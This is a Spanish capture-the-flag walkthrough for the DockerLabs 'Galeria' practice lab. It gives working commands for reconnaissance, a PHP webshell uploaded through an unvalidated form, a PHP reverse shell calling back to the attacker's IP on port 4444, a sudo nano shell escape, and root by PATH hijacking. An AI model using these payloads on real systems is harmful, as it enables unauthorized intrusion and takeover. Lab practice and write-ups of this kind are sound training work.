---
title: DockerLabs - Galeria
source: DockerLabs
difficulty: Fácil
---

Laboratorio para practicar fuzzing web, explotación de file upload sin restricciones y escalada de privilegios mediante PATH hijacking.

## Despliegue

```bash
bash auto_deploy.sh galeria.tar
```

## Reconocimiento

Lanzamos un escaneo de red para identificar los servicios expuestos:

```bash
nmap -sCV -p- 172.17.0.3
```

Encontramos FTP y un servidor Apache en el puerto 80. Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

Descubrimos `/gallery`, que contiene el subdirectorio `/uploads/images` y un archivo `handler.php` — un panel de subida de archivos.

## Explotación

El panel de subida no valida el tipo de archivo. Creamos un webshell PHP:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Lo subimos a través de `handler.php` y verificamos la ejecución remota de comandos:

```bash
curl "http://172.17.0.3/gallery/uploads/images/shell.php?cmd=id"
```

Devuelve `www-data`. A continuación, subimos una reverse shell para obtener acceso interactivo:

```php
<?php
$ip = '172.17.0.1';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Con el listener activo, la ejecutamos:

```bash
nc -lvnp 4444
curl http://172.17.0.3/gallery/uploads/images/rshell.php
```

Acceso conseguido como `www-data`. Sanitizamos la terminal:

```bash
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

## Escalada de privilegios

Comprobamos permisos sudo:

```bash
sudo -l
```

`www-data` puede ejecutar `/bin/nano` como el usuario `gallery`. Pivotamos:

```bash
sudo -u gallery /bin/nano
```

Dentro de nano, ejecutamos una shell con `CTRL+R` → `CTRL+X`:

```
reset; sh 1>&0 2>&0
```

Ya como `gallery`, comprobamos sudo de nuevo:

```bash
sudo -l
```

`gallery` puede ejecutar `/usr/local/bin/runme` como cualquier usuario (ALL) sin contraseña. Inspeccionamos el binario:

```bash
cat /usr/local/bin/runme
```

Las strings del binario revelan que llama a `convert` (ImageMagick) sin ruta absoluta, lo que lo hace vulnerable a **PATH hijacking**. Creamos un `convert` falso:

```bash
echo '/bin/bash' > /tmp/convert
chmod +x /tmp/convert
export PATH=/tmp:$PATH
sudo /usr/local/bin/runme
```

## Conclusión

Root conseguido mediante PATH hijacking sobre un binario SUID ejecutado con sudo. Laboratorio finalizado con éxito.
